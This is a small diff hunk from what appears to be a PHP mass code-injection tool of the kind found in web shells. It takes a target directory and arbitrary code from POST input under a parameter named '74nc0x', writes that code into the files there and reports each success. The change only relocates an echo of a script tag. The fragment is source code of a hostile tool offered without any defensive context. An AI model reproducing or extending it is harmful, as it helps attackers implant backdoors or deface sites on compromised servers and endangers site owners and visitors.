@@ -19,11 +19,11 @@ if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $d
 }
 }
 fclose($fh);
-echo "<script>";
 }
 if(isset($_POST['inject'])){
 $dir=$_POST['dir'];$code=$_POST['74nc0x'];
 inject($dir,$code);
+echo "<script>";
 }
 ?>
 <?php
